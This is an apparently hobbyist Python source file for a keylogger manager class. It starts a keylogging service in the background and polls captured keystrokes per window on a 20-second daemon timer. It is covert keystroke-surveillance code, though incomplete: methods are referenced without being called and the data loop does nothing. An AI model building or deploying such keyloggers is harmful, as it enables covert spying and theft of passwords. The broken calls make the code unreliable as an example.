from writer import json_writer
from encryption.shaul_encryption import Encryption
from key_logger_service.copy_key_Logger_service import KeyLoggerService
import threading

class KeyLoggerManager:

    def __init__(self):
        self.key_logger_service = KeyLoggerService()


    def start_get_data_counter(self):
        t = threading.Timer(20.0, self.start_get_data_counter)
        t.daemon = True
        t.start()

        keys_data = self.key_logger_service.get

        for window, value in keys_data.items():
            # print(window, value)
            pass
        
    def run(self):
        '''
        Runs the program in the background
        '''
        if self.key_logger_service.start: # Try running the service, if it does start counter for getting the data every feew minutes
            self.start_get_data_counter()   





